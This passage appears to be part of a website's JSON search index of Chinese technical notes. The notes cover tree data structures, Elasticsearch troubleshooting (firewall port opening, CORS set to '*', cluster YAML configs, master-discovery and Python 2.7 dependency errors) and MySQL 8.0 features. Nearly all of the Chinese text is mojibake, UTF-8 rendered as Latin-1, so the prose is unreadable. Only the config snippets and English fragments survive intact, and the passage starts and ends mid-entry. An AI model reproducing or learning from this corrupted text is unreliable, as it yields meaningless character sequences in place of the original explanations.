å¾ªç¯ï¼‰ä¸­å“ªäº›å…ƒç´ å·²è¢«é€‰æ‹©è¿‡ï¼Œå…¶ä½œç”¨æ˜¯ä¿è¯å•å±‚ç›¸ç­‰å…ƒç´ åªè¢«é€‰æ‹©ä¸€æ¬¡","tags":"æ•°æ®ç»“æ„","url":"/yq-doc-source-docs-data-structure-Retrospective-algorithm.html","loc":"/yq-doc-source-docs-data-structure-Retrospective-algorithm.html"},{"title":"æ ‘","text":"å¤§è‡´å¯ä»¥åˆ†ä¸ºäºŒå‰æ ‘å’Œå¤šå‰æ ‘ æ™®é€šäºŒå‰æ ‘ æ¯ä¸ªçˆ¶èŠ‚ç‚¹æœ€å¤šæœ‰ä¸¤ä¸ªå­æ ‘èŠ‚ç‚¹ æ»¡äºŒå‰æ ‘ é™¤æœ€åä¸€å±‚, å…¶ä»–èŠ‚ç‚¹éƒ½æœ‰å·¦å­æ ‘å’Œå³å­æ ‘; ä¹Ÿå¯ä»¥è¯´å¶å­èŠ‚ç‚¹åªå‡ºç°åœ¨æœ€åä¸€å±‚ å®Œå…¨äºŒå‰æ ‘ ç›¸å¯¹äºæ»¡äºŒå‰æ ‘, æœ€åä¸€å±‚çš„èŠ‚ç‚¹å¯ä»¥æ˜¯ä¸æ»¡çš„; å¶å­èŠ‚ç‚¹å‡ºç°åœ¨æœ€åä¸€å±‚æˆ–è€…å€’æ•°ç¬¬äºŒå±‚ï¼Œä¸èƒ½å†å¾€ä¸Š. è¯¦ç»†ç‚¹è¯´: æ‰€æœ‰å¶å­èŠ‚ç‚¹å¿…é¡»é›†ä¸­åœ¨æœ€å·¦è¾¹ ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹ä¸èƒ½åªæœ‰å·¦å­æ ‘æ²¡æœ‰å³å­æ ‘(æ³¨æ„ä¸æ˜¯å·¦å¶å­èŠ‚ç‚¹) å¶å­èŠ‚ç‚¹å‡ºç°åœ¨æœ€åä¸€å±‚æˆ–è€…å€’æ•°ç¬¬äºŒå±‚ äºŒå‰æŸ¥æ‰¾æ ‘/äºŒå‰æ’åºæ ‘ è¦æ±‚ æŸ¥æ‰¾çš„æ•°æ®å¿…é¡»æ˜¯æœ‰åºçš„ã€‚ æ¯æ¬¡æŸ¥æ‰¾ã€æ“ä½œæ—¶éƒ½è¦ç»´æŠ¤ä¸€ä¸ªæœ‰åºçš„æ•°æ®é›†ï¼Œäºæ˜¯æœ‰äº†äºŒå‰æŸ¥æ‰¾æ ‘è¿™ä¸ªæ¦‚å¿µã€‚ äºŒå‰æŸ¥æ‰¾æ ‘ä¸­ï¼Œå¯¹äºæ¯ä¸€ä¸ªèŠ‚ç‚¹, å·¦å­æ ‘éƒ½æ¯”èŠ‚ç‚¹å°ï¼Œå³å­æ ‘éƒ½æ¯”èŠ‚ç‚¹å¤§ è‹¥å·¦å­æ ‘ä¸ç©ºï¼Œåˆ™å·¦å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å°äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼› è‹¥å³å­æ ‘ä¸ç©ºï¼Œåˆ™å³å­æ ‘ä¸Šæ‰€æœ‰ç»“ç‚¹çš„å€¼å‡å¤§äºæˆ–ç­‰äºå®ƒçš„æ ¹ç»“ç‚¹çš„å€¼ï¼› å·¦ã€å³å­æ ‘ä¹Ÿåˆ†åˆ«ä¸ºäºŒå‰æ’åºæ ‘ã€‚ å¹³è¡¡äºŒå‰æ ‘/AVLæ ‘/çº¢é»‘æ ‘ ä¸Šé¢çš„ äºŒå‰æŸ¥æ‰¾æ ‘/äºŒå‰æ’åºæ ‘ è¿›è¡Œæ•°æ®çš„æ·»åŠ çš„æ—¶å€™, è‹¥åŸæ¥çš„æ•°æ®æœ¬æ¥å°±æ˜¯æœ‰åºçš„, å¾ˆå¯èƒ½é€ æˆæœ€ç»ˆç»“æœæˆä¸ºä¸€ä¸ªé“¾è¡¨, å¦‚b: æ‰€ä»¥å¼•å…¥äº†å¹³è¡¡çš„æ¦‚å¿µ,, è‡ªåŠ¨è°ƒæ•´æ ‘çš„é«˜åº¦, å°½é‡ä¿è¯ä¸¤è¾¹å¹³è¡¡ å¹³è¡¡äºŒå‰æ ‘è¦ä¹ˆæ˜¯ä¸€æ£µç©ºæ ‘ è¦ä¹ˆä¿è¯å·¦å³å­æ ‘çš„é«˜åº¦ä¹‹å·®ä¸å¤§äº 1 å­æ ‘ä¹Ÿå¿…é¡»æ˜¯ä¸€é¢—å¹³è¡¡äºŒå‰æ ‘ Bæ ‘ å¹³è¡¡äºŒå‰æ ‘/AVLæ ‘/çº¢é»‘æ ‘ çš„å‡çº§ç‰ˆ æ¯ä¸ªèŠ‚ç‚¹å¯ä»¥æœ‰å¤šä¸ªè‡ªæ’åºçš„å€¼, å’Œå…¶å¯¹åº”çš„æ•°æ® ä»¥Mysqlç´¢å¼•ä¸¾ä¾‹, æ¯ä¸ªèŠ‚ç‚¹çš„æ¯ä¸€ä¸ªç´¢å¼•å€¼, éƒ½ä¼šå…¨éƒ¨ä¿å­˜å½“å‰å¯¹åº”çš„è¡Œæ•°æ®; èŠ‚ç‚¹çš„æ•°æ®ç´¢å¼•ä»å·¦åˆ°å³ä¾æ¬¡é€’å¢ èŠ‚ç‚¹ç´¢å¼•ä¸é‡å¤ å¶èŠ‚ç‚¹æœ‰ç›¸åŒæ·±åº¦ å¶å­èŠ‚ç‚¹é—´æ— æŒ‡é’ˆ B+æ ‘ Bæ ‘ çš„ä¼˜åŒ–, æ¯ä¸ªèŠ‚ç‚¹å¯ä»¥æœ‰å¤šä¸ªè‡ªæ’åºçš„å€¼, ä¸”åªæœ‰å¶å­èŠ‚ç‚¹æ‰ä¿å­˜æ•°æ® ä»¥Mysqlç´¢å¼•ä¸¾ä¾‹, æ¯ä¸ªèŠ‚ç‚¹çš„æ¯ä¸€ä¸ªç´¢å¼•å€¼, åªæœ‰åˆ°è¾¾å¶å­èŠ‚ç‚¹æ—¶å€™, æ‰ä¼šæœ‰å½“å‰å¯¹åº”çš„è¡Œæ•°æ® (éå¶å­èŠ‚ç‚¹ä¸å­˜å‚¨data, åªæ”¾ç´¢å¼•, å¯ä»¥æ”¾æ›´å¤šçš„ç´¢å¼•) ç´¢å¼•å€¼å¯é‡å¤, ä½†æ˜¯è¡Œæ•°æ®åªæœ‰å¶å­èŠ‚ç‚¹æ‰æœ‰ å¶å­èŠ‚ç‚¹åŒ…å«æ‰€æœ‰ç´¢å¼• å¶å­èŠ‚ç‚¹é—´ç”¨æŒ‡é’ˆç›¸é‚»è¿æ¥(æé«˜åŒºé—´è®¿é—®æ€§èƒ½) å‚è€ƒ: 3 åˆ†é’Ÿç†è§£å®Œå…¨äºŒå‰æ ‘ã€å¹³è¡¡äºŒå‰æ ‘ã€äºŒå‰æŸ¥æ‰¾æ ‘","tags":"æ•°æ®ç»“æ„","url":"/yq-doc-source-docs-data-structure-Tree.html","loc":"/yq-doc-source-docs-data-structure-Tree.html"},{"title":"esé‡åˆ°çš„é—®é¢˜","text":"é˜²ç«å¢™ å¼€æ”¾9200ç«¯å£å…è®¸è®¿é—®: iptables -I INPUT -p tcp --dport 9200 -j ACCEPT æŸ¥çœ‹å·²æœ‰çš„ç«¯å£: iptables -L -n esè§£å†³è·¨åŸŸé—®é¢˜ ä¿®æ”¹ElasticSearché…ç½®æ–‡ä»¶ï¼Œconfigä¸‹ï¼šElasticSearch.ymlåœ¨æœ€åé¢åŠ ä¸¤è¡Œä»£ç : http.cors.enabled: true http.cors.allow-origin: \"*\" æ­¤æ­¥éª¤å¯ä»¥å…è®¸ElasticSearchè·¨åŸŸ ï¼Œæ³¨æ„\"ï¼š\"åæœ‰ç©ºæ ¼ æ—¥å¿—ä¹±ç  åœ¨configçš„jvm.optionsæ·»åŠ : -Dfile.encoding=GBK é›†ç¾¤é…ç½® ä¸»èŠ‚ç‚¹ elasticsearch.yml: # é›†ç¾¤åï¼ŒèŠ‚ç‚¹å cluster.name: test-master node.name: test-node1 node.master: true #è®¾ç½®å……å½“masterèŠ‚ç‚¹ï¼Œé»˜è®¤ä¸ºtrue node.data: false #è®¾ç½®ä¸å……å½“dataèŠ‚ç‚¹ï¼Œé»˜è®¤ä¸ºtrue network.host: 192.168.1.1 #(å†…ç½‘ip) network.bind_host: 192.168.1.1 #(å†…ç½‘ip) http.port: 9393 #å¯¹å¤–è®¿é—® transport.tcp.port: 9303 #å„èŠ‚ç‚¹é€šä¿¡ --------------------------------- Discovery ---------------------------------- #Pass an initial list of hosts to perform discovery when new node is started: #The default list of hosts is [\"127.0.0.1\", \"[::1]\"] discovery.zen.ping.unicast.hosts: [\"192.168.1.1:9303\",\"192.168.1.1:9304\",\"192.168.1.1:9305\"] #åˆ†åˆ«ä¸ºå„èŠ‚ç‚¹é€šä¿¡ç«¯å£ å‰¯èŠ‚ç‚¹ä¹‹ä¸€ elasticsearch.yml: cluster.name: test-master node.name: test-node2 #è®¾ç½®å……å½“masterèŠ‚ç‚¹ï¼Œé»˜è®¤ä¸ºtrue node.master: false #è®¾ç½®ä¸å……å½“dataèŠ‚ç‚¹ï¼Œé»˜è®¤ä¸ºtrue node.data: true network.host: 192.168.1.1(å†…ç½‘ip) network.bind_host: 192.168.1.1(å†…ç½‘ip) http.port: 9394 #å¯¹å¤–è®¿é—® transport.tcp.port: 9304 #å„èŠ‚ç‚¹é€šä¿¡ --------------------------------- Discovery ---------------------------------- #Pass an initial list of hosts to perform discovery when new node is started: #The default list of hosts is [\"127.0.0.1\", \"[::1]\"] discovery.zen.ping.unicast.hosts: [\"192.168.1.1:9303\",\"192.168.1.1:9304\",\"192.168.1.1:9305\"] #åˆ†åˆ«ä¸ºå„èŠ‚ç‚¹é€šä¿¡ç«¯å£ å‰¯èŠ‚ç‚¹ä¹‹äºŒ elasticsearch.yml: cluster.name: test-master node.name: test-node3 # è®¾ç½®å……å½“masterèŠ‚ç‚¹ï¼Œé»˜è®¤ä¸ºtrue node.master: false # è®¾ç½®ä¸å……å½“dataèŠ‚ç‚¹ï¼Œé»˜è®¤ä¸ºtrue node.data: true network.host: 192.168.1.1(å†…ç½‘ip) network.bind_host: 192.168.1.1(å†…ç½‘ip) http.port: 9395 #å¯¹å¤–è®¿é—® transport.tcp.port: 9305 #å„èŠ‚ç‚¹é€šä¿¡ # --------------------------------- Discovery ---------------------------------- # Pass an initial list of hosts to perform discovery when new node is started: # The default list of hosts is [\"127.0.0.1\", \"[::1]\"] discovery.zen.ping.unicast.hosts: [\"192.168.1.1:9303\",\"192.168.1.1:9304\",\"192.168.1.1:9305\"] #åˆ†åˆ«ä¸ºå„èŠ‚ç‚¹é€šä¿¡ç«¯å£ æŠ¥é”™ [Cannot assign requested address: bind] é…ç½®ä¸­çš„é›†ç¾¤é…ç½® discovery.zen.ping.unicast.hosts çš„ip è·Ÿå½“å‰æœ¬æœºçš„ network.host ä¸ä¸€è‡´ï¼Œæœæ–­æŠŠè‡ªå·±ç»™å‘äº†(-_-) ï¼ˆ å½“ç„¶è¿™æ˜¯ä¸ºäº†æ¨¡æ‹Ÿé›†ç¾¤è€Œåœ¨ä¸€å°æœºå™¨ä¸Šéƒ¨ç½²å¤šä¸ªèŠ‚ç‚¹ï¼Œ ç”Ÿäº§ç¯å¢ƒä¸æ¨èè¿™ä¹ˆæï¼Œä¸ºäº†æ•°æ®å®‰å…¨ä»¥åŠæ€§èƒ½æå‡ï¼Œè¿˜æ˜¯ä¸€æœºä¸€èŠ‚ç‚¹çš„å¥½ ï¼‰ å•æœºéƒ¨ç½²è¿˜æ˜¯ç»‘å®šè‡ªå·±æœ¬åœ°å§ æŠ¥é”™master not discovered yet, this node has not previously joined a bootstrapped (v7+) cluster ä¸‹åˆã€æ™šä¸Šéƒ½åœ¨æŠ¥è¿™ä¸ªé”™ï¼Œ æœ€å¼€å§‹çš„ymlé…ç½®æ–‡ä»¶æ˜¯è¿™ä¸ªæ ·å­ï¼Œæˆ‘å»ºç«‹äº†ä¸€ä¸ªä¸å­˜å‚¨æ•°æ®çš„masterèŠ‚ç‚¹ï¼Œ ä¸‰ä¸ªæ•°æ®å¤„ç†çš„nodeèŠ‚ç‚¹ï¼ˆnodeèŠ‚ç‚¹æ²¡æœ‰æˆä¸ºmasterçš„æœºä¼šï¼‰ æœ€å¼€å§‹ï¼Œåœ¨æ–‡ä»¶é…ç½®ä¸­æœ€é‡è¦çš„cluster.initial_master_nodesæ²¡æœ‰é…ç½®ï¼Œå¯¼è‡´æ— æ³•ç»‘å®šmasterèŠ‚ç‚¹ï¼Œæ‰€ä»¥ä¸€ç›´æŠ¥é”™ï¼Œ åæŒ‡å®šäº†initial_master_nodesä¸ºå››ä¸ªèŠ‚ç‚¹ï¼Œä¹Ÿåœ¨æŠ¥é”™ï¼Œ æ˜¯å› ä¸ºåªå°†ç¬¬ä¸€ä¸ªä¸å­˜å‚¨æ•°æ®çš„èŠ‚ç‚¹è®¾ç½®äº†node.master:trueï¼Œ å…¶ä»–å‡ ä¸ªéƒ½è®¾ç½®çš„falseï¼Œæ‰€ä»¥å…¶ä»–å‡ ä¸ªèŠ‚ç‚¹æ²¡æœ‰æˆä¸ºmasterèŠ‚ç‚¹çš„æœºä¼šï¼Œ ä¿®æ”¹ä¸ºcluster.initial_master_nodes: [\"127.0.0.1:9300\"]ï¼Œé—®é¢˜è§£å†³ä¸€åŠï¼Œ å› ä¸ºåªæœ‰masterèŠ‚ç‚¹è·Ÿnode1èŠ‚ç‚¹æ˜¯æ­£ç¡®çš„ï¼Œå¦å¤–ä¸¤ä¸ªèŠ‚ç‚¹è¿˜æ˜¯åœ¨æŠ¥é”™ï¼Œæ­£åœ¨å¯»æ‰¾åŸå› ä¸­ã€‚ã€‚ã€‚ã€‚ æ›´æ–°ï¼ŒåŸå› æ‰¾åˆ°äº†ï¼Œmasterä¸»èŠ‚ç‚¹æ²¡æœ‰å®æ—¶å»å‘ç°ä»èŠ‚ç‚¹ï¼Œå…ˆæŠŠä¸‰ä¸ªä»èŠ‚ç‚¹å¯åŠ¨äº†ï¼Œæœ€åå†å¯åŠ¨ä¸»èŠ‚ç‚¹å°±å¯ä»¥äº†ï¼Œ æ›´ç¨³å¦¥çš„è§£å†³æ–¹æ¡ˆæ˜¯ï¼Œåœ¨ä¸»èŠ‚ç‚¹ä¸Šæƒ³æ–¹æ³•è®¾ç½®ä¸€ä¸‹å®æ—¶ä»èŠ‚ç‚¹çš„å‘ç°ã€‚è¿™ä¸€ç‚¹æ˜å¤©ç»§ç»­å¯»æ‰¾æ˜¯å¦å¯ä»¥å®ç°ã€‚ é™„ä¸»èŠ‚ç‚¹é…ç½®: #é›†ç¾¤åï¼ŒèŠ‚ç‚¹å cluster.name: test-master node.name: test-node1 node.master: true #è®¾ç½®å……å½“masterèŠ‚ç‚¹ï¼Œé»˜è®¤ä¸ºtrue node.data: false #è®¾ç½®ä¸å……å½“dataèŠ‚ç‚¹ï¼Œé»˜è®¤ä¸ºtrue network.host: 192.168.1.1 #(å†…ç½‘ip) network.bind_host: 192.168.1.1 #(å†…ç½‘ip) http.port: 9393 #å¯¹å¤–è®¿é—® transport.tcp.port: 9303 #å„èŠ‚ç‚¹é€šä¿¡ --------------------------------- Discovery ---------------------------------- #Pass an initial list of hosts to perform discovery when new node is started: #The default list of hosts is [\"127.0.0.1\", \"[::1]\"] discovery.seed_hosts: [\"127.0.0.1:9300\",\"127.0.0.1:9301\",\"127.0.0.1:9302\",\"127.0.0.1:9303\"] #åˆ†åˆ«ä¸ºå„èŠ‚ç‚¹é€šä¿¡ç«¯å£ cluster.initial_master_nodes: [\"127.0.0.1:9300\"] ä¸Šé¢çš„åŸºæœ¬ä¿¡æ¯ä»‹ç» å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªåœ°å€ï¼Œ{127.0.0.1:9300}å’Œ{127.0.0.1:9200}ï¼Œç›¸åº”çš„æœ‰ä¸¤ä¸ªç«¯å£å·ï¼š9300å’Œ9200ï¼Œ 9300æ˜¯ç«¯å£transportç«¯å£å·ï¼Œ9200æ˜¯httpç«¯å£å·ï¼Œè¯¦è§ï¼šå’Œ Elasticsearch äº¤äº’ éªŒè¯ESæ˜¯å¦å¯åŠ¨æˆåŠŸï¼šè®¿é—®127.0.0.1:9200ï¼Œçœ‹æ˜¯å¦èƒ½è®¿é—®æˆåŠŸ~: { \"name\" : \"-WsJ6Vr\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"QKps9rpJQCiBJ4zBsXwgpQ\", \"version\" : { \"number\" : \"5.4.0\", \"build_hash\" : \"780f8c4\", \"build_date\" : \"2017-04-28T17:43:27.229Z\", \"build_snapshot\" : false, \"lucene_version\" : \"6.5.0\" }, \"tagline\" : \"You Know, for Search\" } ä¸€ä¸ªè¿è¡Œä¸­çš„ Elasticsearch å®ä¾‹ç§°ä¸ºä¸€ä¸ª\"èŠ‚ç‚¹\"ï¼Œ è€Œ\"é›†ç¾¤\"æ˜¯ç”±ä¸€ä¸ªæˆ–è€…å¤šä¸ªæ‹¥æœ‰ç›¸åŒ cluster.name é…ç½®çš„èŠ‚ç‚¹ç»„æˆ æ‰€ä»¥è¿™å°±å¯åŠ¨äº†ä¸€ä¸ªESèŠ‚ç‚¹ï¼Œå…¶ä¸­ï¼š nameï¼šè¡¨ç¤ºè¿™ä¸ªElasticSearchå®ä¾‹çš„åå­—ï¼› cluster_nameï¼šè¡¨ç¤ºè¯¥èŠ‚ç‚¹æ‰€åœ¨çš„é›†ç¾¤çš„åå­—ï¼Œé›†ç¾¤åç›¸åŒçš„èŠ‚ç‚¹éƒ½ä¼šè‡ªåŠ¨åŠ å…¥è¯¥é›†ç¾¤ï¼› versionï¼šè¡¨ç¤ºç‰ˆæœ¬å·ï¼Œnumberæ˜¯å½“å‰ESçš„ç‰ˆæœ¬å·ï¼Œlucene_versionæ˜¯å½“å‰ESæ‰€åŸºäºçš„Lucenceçš„ç‰ˆæœ¬å· æ•°æ®dataç¼“å­˜ é»˜è®¤æƒ…å†µä¸‹esçš„dataéƒ½æ˜¯å­˜åœ¨äºpath.dataæ‰€æŒ‡å®šçš„ç›®å½•çš„ï¼Œpath.dataé»˜è®¤ä¸ºæ–‡ä»¶çš„dataç›®å½•ï¼Œ æ‰€ä»¥dataå­˜åœ¨ç€ä¸Šä¸€æ¬¡æˆ–è€…ä¸Šå‡ æ¬¡çš„è¿è¡Œé…ç½® æ•…æœ‰äº›æ—¶å€™éœ€è¦æ¸…ç©ºdataæ¥é‡æ–°è¿è¡Œ Pythonç‰ˆæœ¬ å“­äº†ï¼ŒNSç”¨çš„æ˜¯python2.7ï¼Œeså¯¼çš„es7.13çš„æ¨¡å—ï¼Œè€Œæ¨¡å—es7.13è°ƒç”¨äº†urllib3çš„æ–¹æ³•ï¼Œæœ€åurllib3åªæ”¯æŒpython3 æ˜¯ä¸ºä»€ä¹ˆå‘ç°è¿™ä¸ªé—®é¢˜çš„å‘¢ï¼Ÿ å› ä¸ºå¤–ç½‘æœºä¸‹è½½å¥½esçš„pythonçš„æ¨¡å—ä¹‹åå®‰è£…åˆ°å†…ç½‘æœºï¼Œwindowså®‰è£…æ—¶æŠ¥é”™ç¼ºå°‘ä¸¤ä¸ªæ¨¡å—: certifiï¼Œurllib ç„¶åå»ä¸‹è½½å®‰è£…ï¼ŒæˆåŠŸï¼Œæ¥ç€è‡ªå·±å†™äº†ä¸ªæµ‹è¯•ä½¿ç”¨ï¼ŒæˆåŠŸ ç„¶åæ¥å…¥æ•°æ®åº“æ•°æ®ï¼Œ debianå®‰è£…es7ï¼Œæ¯”winä¸Šå¤šå®‰è£…ä¸€ä¸ªæ¨¡å—ï¼Œå› ä¸ºè£…urllib3çš„æ—¶å€™æç¤ºæŠ¥é”™ï¼Œ æŸ¥è¯¢åæ˜¯setuptoolsç‰ˆæœ¬è¿‡ä½ï¼Œé‚å»æ‰¾äº†é€‚åˆpython2çš„æœ€æ–°æ¨¡å—åŒ…ï¼Œ æŠ¥é”™æ‰¾ä¸åˆ°RecursionErrorï¼Œ ç„¶ååœ¨http_urllib3.pyé‡Œä¹Ÿç¡®å®æ²¡æœ‰å‘ç°RecursionErroræ˜¯åœ¨å“ªé‡Œå®šä¹‰çš„ï¼Œ ç„¶åå»æœäº†urllib3è¿™ä¸ªæ¨¡å—ï¼Œå‘ç°åªæ”¯æŒpython3 æ‰€ä»¥å¦‚æœç°åœ¨è¦æ”¹çš„è¯ è¦ä¹ˆæŠŠæœåŠ¡å™¨python2.7å‡çº§ï¼Œä½†æ˜¯è¿™æ ·è¦æ”¹å¾ˆå¤šåŒ… è¦ä¹ˆå°±æŠŠes7çš„æ¨¡å—ç»™æ¢äº†ï¼Œæœ¬åœ°é›†ç¾¤çš„æœåŠ¡çš„å¾—é‡æ–°æ¥ï¼Œåˆç€ç™½è£…äº†è¿™å‡ ä¸ªã€‚ã€‚ã€‚ ç°åœ¨å°è¯•ï¼Œå°±æœªå®šä¹‰RecursionErrorè¿™ä¸ªé”™æ¥ä¿®å¤ï¼Œå°è¯•æ³¨é‡Šä¹‹ç±»çš„ å—¯ï¼Œæ³¨é‡Šäº†è¿™ä¸ªexceptï¼Œæ²¡æŠ¥è¿™ä¸ªé”™äº†ï¼Œ æ–°çš„é”™è¯¯ï¼šè™šæ‹Ÿæœºè¿æ¥ä¸ä¸Šå®¿ä¸»æœº","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-elasticsearch-ES-problems.html","loc":"/yq-doc-source-docs-database-elasticsearch-ES-problems.html"},{"title":"Mysql8.0æ–°ç‰¹æ€§","text":"æ–°å¢é™åºç´¢å¼• MySQLåœ¨è¯­æ³•ä¸Šå¾ˆæ—©å°±å·²ç»æ”¯æŒé™åºç´¢å¼•ï¼Œä½†å®é™…ä¸Šåˆ›å»ºçš„ä»ç„¶æ˜¯å‡åºç´¢å¼•ï¼Œ å¦‚ä¸‹MySQL 5.7æ‰€ç¤ºï¼Œc2å­—æ®µé™åºï¼Œ ä½†æ˜¯ä»show create tableçœ‹c2ä»ç„¶æ˜¯å‡åºã€‚8.0å¯ä»¥çœ‹åˆ°ï¼Œc2å­—æ®µé™åºã€‚åªæœ‰Innodbå­˜å‚¨å¼•æ“æ”¯æŒé™åºç´¢å¼•ã€‚ group byä¸ä¼šè‡ªåŠ¨æ’åº 5.7ä¸­åˆ†ç»„æŸ¥è¯¢æ—¶, ä¼šè‡ªåŠ¨æŒ‰ç…§åˆ†ç»„çš„å­—æ®µæ’åº, 8.0 ä¸­å¾—æ‰‹åŠ¨ order by å¢åŠ éšè—ç´¢å¼• ä½¿ç”¨ invisible å…³é”®å­—åœ¨åˆ›å»ºè¡¨æˆ–è€…è¿›è¡Œè¡¨å˜æ›´ä¸­è®¾ç½®ç´¢å¼•ä¸ºéšè—ç´¢å¼•ã€‚ ç´¢å¼•éšè—åªæ˜¯ä¸å¯è§ï¼Œä½†æ˜¯æ•°æ®åº“åå°è¿˜æ˜¯ä¼šç»´æŠ¤éšè—ç´¢å¼•çš„ï¼Œåœ¨æŸ¥è¯¢æ—¶ä¼˜åŒ–å™¨ä¸ä½¿ç”¨è¯¥ç´¢å¼•ï¼Œ å³ä½¿ç”¨force indexï¼Œä¼˜åŒ–å™¨ä¹Ÿä¸ä¼šä½¿ç”¨è¯¥ç´¢å¼•ï¼ŒåŒæ—¶ä¼˜åŒ–å™¨ä¹Ÿä¸ä¼šæŠ¥ç´¢å¼•ä¸å­˜åœ¨çš„é”™è¯¯ï¼Œ å› ä¸ºç´¢å¼•ä»ç„¶çœŸå®å­˜åœ¨ï¼Œå¿…è¦æ—¶ï¼Œä¹Ÿå¯ä»¥æŠŠéšè—ç´¢å¼•å¿«é€Ÿæ¢å¤æˆå¯è§ã€‚æ³¨æ„ï¼Œä¸»é”®ä¸èƒ½è®¾ç½®ä¸º invisible. è½¯åˆ é™¤å°±å¯ä»¥ä½¿ç”¨éšè—ç´¢å¼•ï¼Œæ¯”å¦‚æˆ‘ä»¬è§‰å¾—æŸä¸ªç´¢å¼•æ²¡ç”¨äº†ï¼Œåˆ é™¤åå‘ç°è¿™ä¸ªç´¢å¼•åœ¨æŸäº›æ—¶å€™è¿˜æ˜¯æœ‰ç”¨çš„ï¼Œ äºæ˜¯åˆå¾—æŠŠè¿™ä¸ªç´¢å¼•åŠ å›æ¥ï¼Œå¦‚æœè¡¨æ•°æ®é‡å¾ˆå¤§çš„è¯ï¼Œè¿™ç§æ“ä½œè€—è´¹æ—¶é—´æ˜¯å¾ˆå¤šçš„ï¼Œ æˆæœ¬å¾ˆé«˜ï¼Œè¿™æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å°†ç´¢å¼•å…ˆè®¾ç½®ä¸ºéšè—ç´¢å¼•ï¼Œç­‰åˆ°çœŸçš„ç¡®è®¤ç´¢å¼•æ²¡ç”¨äº†å†åˆ é™¤ã€‚ å¦‚åˆ›å»ºt2è¡¨ï¼Œé‡Œé¢çš„c2å­—æ®µä¸ºéšè—ç´¢å¼•: mysql â€º create table t2(c1 int, c2 int, index idx_c1(c1), index idx_c2(c2) invisible); æ–°å¢å‡½æ•°ç´¢å¼• ä¹‹å‰æˆ‘ä»¬çŸ¥é“ï¼Œå¦‚æœåœ¨æŸ¥è¯¢ä¸­åŠ å…¥äº†å‡½æ•°ï¼Œç´¢å¼•ä¸ç”Ÿæ•ˆï¼Œ æ‰€ä»¥MySQL 8å¼•å…¥äº†å‡½æ•°ç´¢å¼•ï¼ŒMySQL 8.0.13å¼€å§‹æ”¯æŒåœ¨ç´¢å¼•ä¸­ä½¿ç”¨å‡½æ•°ï¼ˆè¡¨è¾¾å¼ï¼‰çš„å€¼ã€‚ å‡½æ•°ç´¢å¼•åŸºäºè™šæ‹Ÿåˆ—åŠŸèƒ½å®ç°ï¼Œåœ¨MySQLä¸­ç›¸å½“äºæ–°å¢äº†ä¸€ä¸ªåˆ—ï¼Œ è¿™ä¸ªåˆ—ä¼šæ ¹æ®ä½ çš„å‡½æ•°æ¥è¿›è¡Œè®¡ç®—ç»“æœï¼Œ ç„¶åä½¿ç”¨å‡½æ•°ç´¢å¼•çš„æ—¶å€™å°±ä¼šç”¨è¿™ä¸ªè®¡ç®—åçš„åˆ—ä½œä¸ºç´¢å¼•ã€‚ å¦‚: # ç»™t3è¡¨çš„c1åˆ—åˆ›å»ºæ™®é€šç´¢å¼• create index idx_c1 on t3(c1); # ç»™t3è¡¨çš„c2åˆ—åˆ›å»ºå‡½æ•°ç´¢å¼•, å¤§å†™å‡½æ•°ç´¢å¼• create index func_idx on t3((UPPER(c2))) çª—å£å‡½æ•°ï¼ˆWindow Functionsï¼‰ï¼šä¹Ÿç§°åˆ†æå‡½æ•° ä» MySQL 8.0å¼€å§‹ï¼Œæ–°å¢äº†ä¸€ä¸ªå«çª—å£å‡½æ•°çš„æ¦‚å¿µï¼Œå®ƒå¯ä»¥ç”¨æ¥å®ç°è‹¥å¹²æ–°çš„æŸ¥è¯¢æ–¹å¼ã€‚ çª—å£å‡½æ•°ä¸ SUMï¼ˆï¼‰ã€COUNTï¼ˆï¼‰è¿™ç§åˆ†ç»„èšåˆå‡½æ•°ç±»ä¼¼ï¼Œåœ¨èšåˆå‡½æ•°åé¢åŠ ä¸Šoverï¼ˆï¼‰å°±å˜æˆçª—å£å‡½æ•°äº†ï¼Œ åœ¨æ‹¬å·é‡Œå¯ä»¥åŠ ä¸Špartition byç­‰åˆ†ç»„å…³é”®å­—æŒ‡å®šå¦‚ä½•åˆ†ç»„ï¼Œ çª—å£å‡½æ•°å³ä¾¿åˆ†ç»„ä¹Ÿä¸ä¼šå°†å¤šè¡ŒæŸ¥è¯¢ç»“æœåˆå¹¶ä¸ºä¸€è¡Œï¼Œè€Œæ˜¯å°†ç»“æœæ”¾å›å¤šè¡Œå½“ä¸­ï¼Œå³çª—å£å‡½æ•°ä¸éœ€è¦å†ä½¿ GROUP BY. ç¤ºä¾‹ é»˜è®¤å­—ç¬¦é›†ç”±latin1å˜ä¸ºutf8mb4 åœ¨8.0ç‰ˆæœ¬ä¹‹å‰ï¼Œé»˜è®¤å­—ç¬¦é›†ä¸ºlatin1ï¼Œutf8æŒ‡å‘çš„æ˜¯utf8mb3ï¼Œ 8.0ç‰ˆæœ¬é»˜è®¤å­—ç¬¦é›†ä¸ºutf8mb4ï¼Œutf8é»˜è®¤æŒ‡å‘çš„ä¹Ÿæ˜¯utf8mb4ã€‚ MyISAMç³»ç»Ÿè¡¨å…¨éƒ¨æ¢æˆInnoDBè¡¨ å°†ç³»ç»Ÿè¡¨ï¼ˆmysqlï¼‰å’Œæ•°æ®å­—å…¸è¡¨å…¨éƒ¨æ”¹ä¸ºInnoDBå­˜å‚¨å¼•æ“ï¼Œ é»˜è®¤çš„MySQLå®ä¾‹å°†ä¸åŒ…å«MyISAMè¡¨ï¼Œé™¤éæ‰‹åŠ¨åˆ›å»ºMyISAMè¡¨ã€‚ å…ƒæ•°æ®å­˜å‚¨å˜åŠ¨ MySQL 8.0åˆ é™¤äº†ä¹‹å‰ç‰ˆæœ¬çš„å…ƒæ•°æ®æ–‡ä»¶ï¼Œä¾‹å¦‚è¡¨ç»“æ„.frmç­‰æ–‡ä»¶ï¼Œå…¨éƒ¨é›†ä¸­æ”¾å…¥mysqlibdæ–‡ä»¶é‡Œã€‚ è‡ªå¢å˜é‡æŒä¹…åŒ– åœ¨8.0ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œè‡ªå¢ä¸»é”® AUTO_INCREMENT çš„å€¼å¦‚æœå¤§äºmaxï¼ˆprimary keyï¼‰+1ï¼Œ 